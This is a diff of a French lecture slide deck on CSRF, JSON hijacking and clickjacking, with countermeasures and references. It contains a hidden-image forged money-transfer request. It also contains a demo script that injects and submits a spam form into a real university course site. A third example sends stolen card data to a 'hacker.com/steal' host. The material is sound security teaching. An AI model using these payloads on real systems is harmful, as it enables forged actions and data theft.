@@ -2,8 +2,14 @@
 layout: lesson
 title: CSRF
 subtitle: Cross Site Request Forgery
-scripts: ['http://coffeescript.org/extras/coffee-script.js']
+scripts:  ../js/mock-browser.js
 ---
+
+<style>
+.cli  { box-shadow: 0 0 2px 2px blue; }
+.srv { box-shadow: 0 0 2px 2px yellow; }
+.att    { box-shadow: 0 0 2px 2px red; }
+</style>
 
 <section>
 
@@ -13,21 +19,26 @@ scripts: ['http://coffeescript.org/extras/coffee-script.js']
 
 ### Les acteurs
 
-Un **server** web possédant des **données confidentielles**.
+Servane, un **server** web possédant des **données
+confidentielles**.
+{:.srv}
 
-Un **utilisateur légitime authentifié** ayant des **droits sur les
-données**.
+Clélie, un **utilisateur légitime authentifié** ayant des **droits sur
+les données**.
+{:.cli}
 
-Un **attaquant** malicieux qui :
+Athanase, un **attaquant** malicieux qui :
+{:.att}
 
-- connaît l'API du server (par ex., l'API est publique),
+- connaît l'API du serveur (par ex., l'API est publique),
 - contrôle un site tiers **sans rapport avec le server victime** (par
   ex., son propre server, ou un site avec une injection XSS).
+{:.att}
 
 ### Les effets
 
-L'attaquant gagne accès aux données confidentielles avec les droits de
-l'utilisateur légitime.
+Athanase gagne accès aux données confidentielles avec les droits de
+Clélie.
 
 </section>
 <section class="compact">
@@ -36,14 +47,16 @@ l'utilisateur légitime.
 
 ### Pré-requis...
 
-- L'utilisateur est **loggué sur le server** (par ex., il garde un
-  onglet ouvert sur une page du server) ;
-- L'utilisateur tombe par hasard sur **la page malicieuse de
-  l'attaquant**.
+- <span class="cli">Clélie est **logguée sur le serveur**</span> (par
+  ex., el garde un onglet ouvert sur une <span class="srv">page de
+  Servane</span>) ;
+- Clélie tombe (par hasard) sur **la page malicieuse
+  d'Athanase**{:.att}.
 
 ### ...et ensuite
 
-- La **page de l'attaquant** déclenche une requête au server
+- La **page de l'attaquant**{:.att} déclenche une requête au <span
+  class="srv">serveur</span>.
 
 ~~~
 <html>
@@ -53,29 +66,18 @@ l'utilisateur légitime.
 <ul>
 <li>Two slices of bread</li>
 ...
-<img width="0" height="0"
-     src="http://server.com/transfer?to=attacker&amount=10k"/>
+<img width="0" height="0" src="http://servane.org/transfer?to=attacker&amount=10k"/>
 ~~~
+{:.att}
 
-- Le browser de l'utilisateur, en voulant télécharger l'image,
-déclanche un **transfert d'argent authentifié**.
+- Le <span class="cli">browser de Clélie</span>, en voulant
+  télécharger l'image, déclanche un **transfert d'argent
+  authentifié**{:.att}.
 
 </section>
 <section>
 
-## Démo CSRF : e-campus 2
-
-1. Connectez-vous à <http://e-campus2.uvsq.fr/>,
-2. Allez vers la
-   [page du cours](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946).
-3. Maintenant, supposons que vous visitiez un site au hasard (par ex.,
-   ce site !!!), contenant cet `<iframe>` (caché par
-   [`display:none`](javascript:){:.hide-frame}):
-
-<iframe id="ecampus" style="width:90%;height:4em;margin:auto;display:block">
-</iframe>
-
-<style>
+<style scoped>
 #ecampus.fade-out { opacity: 0 }
 #ecampus, #ecampus.fade-out {
     transition: opacity 1s;
@@ -83,37 +85,19 @@ déclanche un **transfert d'argent authentifié**.
 }
 </style>
 
-<script type="text/coffeescript">
-form = Element.prototype.append.call $('#ecampus').contentDocument.body, 'form#ecampus-form'
-form.method = 'GET'
-form.action = 'http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946/cours_plan_form'
-form.append = Element.prototype.append.bind(form)
+## Démo CSRF : e-campus 2
 
-data =
-    'typeElement'      : 'TexteLibre',
-    'titreElement'     : 'Cheap Viagra',
-    'createurElement'  : 'Hacker',
-    'form.submitted'   : '1',
-    'form.button.save' : 'label_save'
+1. Connectez-vous à <http://e-campus2.uvsq.fr/>{:.srv},
+2. Allez vers la
+   [page du cours](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946){:.srv}.
+3. Maintenant, supposons que vous visitiez un site au hasard (par ex.,
+   <span class="att">ce site</span> !!!), contenant cet `<iframe>`{:.att}
+   (caché par [`display:none`](){:.hide-frame}):
 
-for n, v of data
-    i = form.append 'input'
-    i.type = 'text'
-    i.name = n
-    i.value = v
+<iframe id="ecampus" class="att" style="width:90%;height:4em;margin:auto;display:block">
+</iframe>
 
-i = form.append 'input'
-i.type = 'submit'
-i.value = 'Submit'
-
-$('#csrf').onclick = () -> form.submit()
-
-for t in $$('.hide-frame')
-    t.onclick = () ->
-        $('#ecampus').classList.toggle 'fade-out'
-</script>
-
-4. Si vous [cliquez ici](javascript:){:#csrf}, le formulaire est
+4. Si vous [cliquez ici](){:#csrf}, le formulaire est
    soumis, et le CSRF est exécuté.
 5. Maintenant rafraîchissez
    [la page du cours](http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946)
@@ -122,11 +106,50 @@ for t in $$('.hide-frame')
 
 
 **Note :** Si le `<iframe>` avait été
-  [vraiment caché](javascript:){:.hide-frame}, vous n'auriez rien
-  remarqué.
+[vraiment caché](){:.hide-frame}, vous n'auriez rien remarqué.
 
 **Note:** Il aurait été possible de tout faire **sans attendre de clic
   de l'utilisateur !**
+
+<script>
+document.on('DOMContentLoaded', function() {
+	form = Element.prototype.append.call($('#ecampus').contentDocument.body, 'form#ecampus-form');
+	form.method = 'GET';
+	form.action = 'http://e-campus2.uvsq.fr/cours/lucadefe/Cours.lucadefe.2012-01-04.1946/cours_plan_form';
+	form.append = Element.prototype.append.bind(form);
+
+	data = {
+		'typeElement'      : 'TexteLibre',
+		'titreElement'     : 'Cheap Viagra',
+		'createurElement'  : 'Hacker',
+		'form.submitted'   : '1',
+		'form.button.save' : 'label_save'
+	};
+
+	for (n in data) {
+		i = form.append('input');
+		i.type = 'text';
+		i.name = n;
+		i.value = data[n];
+	}
+
+	i = form.append('input');
+	i.type = 'submit';
+	i.value = 'Submit';
+});
+
+$('#csrf').on('click', function(e) {
+	form.submit();
+	e.preventDefault();
+});
+
+$$('.hide-frame').forEach(function(t) {
+	t.on('click', function(e) {
+		$('#ecampus').classList.toggle('fade-out');
+		e.preventDefault()
+	});
+});
+</script>
 
 </section>
 <section class="compact">
@@ -159,70 +182,74 @@ new UserData(
   [JSONP](http://en.wikipedia.org/wiki/JSONP).
 
 </section>
-<section class="compact">
+<section>
 
 ## L'application legitime
 
-1. Le client charge le JavaScript fourni par le server
+1. Clélie charge le JavaScript fourni par le Servane
+{:.cli}
 
 ~~~
-<script src="http://www.server.com/js/api.js"></script>
+<script src="http://www.servane.org/js/api.js"></script>
 ~~~
+{:.srv}
 
 2. Le script contient la defintion de `UserData`
 {: start="2"}
 
 ~~~
-function Userdata() {
-  this.creditCard = ...
-}
+function Userdata() { this.creditCard = ... }
 ~~~
+{:.srv}
 
-3. Le client client fait une requête AJAX à l'API
-{: start="3"}
+3. Clélie client fait une requête AJAX à l'API
+{: .cli start="3"}
 
 ~~~
 xhr = new XMLHttpRequest();
 xhr.open("GET", "http://api.server.com/getUserData?user=1000");
 ~~~
+{:.srv}
 
-4. Le client `eval`ue le JavaScript et traite les données
-{: start="4"}
+4. Clélie `eval`ue le JavaScript et traite les données
+{: .cli start="4"}
 
 ~~~
 var data = eval(xhr.response());
 var card_number = data[5];
 ~~~
+{:.srv}
 
 </section>
-<section class="compact">
+<section>
 
 ## L'attaquant
 
-1. Crée une page sur un autre server qu'il contrôle ;
-2. Inclue le JavaScript suivant (qui remplace la définition de
+1. Athanase crée une page sur un autre server qu'il contrôle ;
+2. Inclut le JavaScript suivant (qui remplace la définition de
    `UserData`)
-
+{:.att}
+   
 ~~~
 function UserData() {
     var img = new Image();
-    img.src = "http://hacker.com/steal?" 
-              + Array.join(",", arguments);
+    img.src = "http://hacker.com/steal?" + Array.join(",", arguments);
 }
 ~~~
+{:.att}
 
-3. Il force le client à faire une requête à l'API
-{: start="3"}
+3. Il force Clélie à faire une requête à l'API
+{: start="3" .att}
 
 ~~~
 xhr = new XMLHttpRequest();
-xhr.open("GET",
-	     "http://api.server.com/getUserData?user=1000");
+xhr.open("GET", "http://api.server.com/getUserData?user=1000");
 ~~~
+{:.att}
 
 4. Le browser envoye les données à `http://hacker.com/steal` (à cause
    de l'`Image()`).
-{: start="4"}
+{: start="4" .cli}
 
 </section>
 <section>
@@ -248,11 +275,13 @@ carnets d'adresses
 ## Contremesures CSRF
 
 ### Utilisateur
+{:.cli}
 
 - Se djélogguer ;
 - Utiliser plusieurs browsers.
 
 ### Développeur
+{:.srv}
 
 - Préférer POST à GET pour les requêtes qui déclenchent des actions ;
 - Contrôler l'entête `Referer` ;
@@ -296,7 +325,7 @@ confirmation sans son consentement
 
 ## Contremesures
 
-Entête Expérimentale
+Entête `X-Frame-Options`, partie du standard CSP
 
 ~~~
 X-Frame-Options: SAMEORIGIN
@@ -305,6 +334,9 @@ X-Frame-Options: SAMEORIGIN
 - Empêche aux browsers d'inclure la page dans des frames cross-domain ;
 - Twitter s'en sert depuis 2009...
 
+<div id="sop" class="mock-browser content" data-src="https://twitter.com"></div>
+
+
 </section>
 <section>
 
@@ -312,13 +344,19 @@ X-Frame-Options: SAMEORIGIN
 
 ### Google browser security guide (M. Zalewski)
 
-- <http://code.google.com/p/browsersec/wiki/Part1>,
-- <http://code.google.com/p/browsersec/wiki/Part2>.
+- <https://code.google.com/p/browsersec/wiki/Part1>,
+- <https://code.google.com/p/browsersec/wiki/Part2>,
+- <https://code.google.com/p/browsersec/wiki/Part3>,
+
+### CSRF
+
+- [OWASP sur CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet),
+- The tangled web: <http://lcamtuf.coredump.cx/tangled/>,
 
 ### Clickjacking
 
 - [`X-Frame-Options`](https://developer.mozilla.org/docs/HTTP/X-Frame-Options),
 - [Ajax and Mashup Security](http://www.openajax.org/whitepapers/Ajax and Mashup Security.php#Mashups),
-- <https://www.owasp.org/index.php/Clickjacking>.
+- [OWASP sur le Clickjacking](https://www.owasp.org/index.php/Clickjacking).
 
 </section>
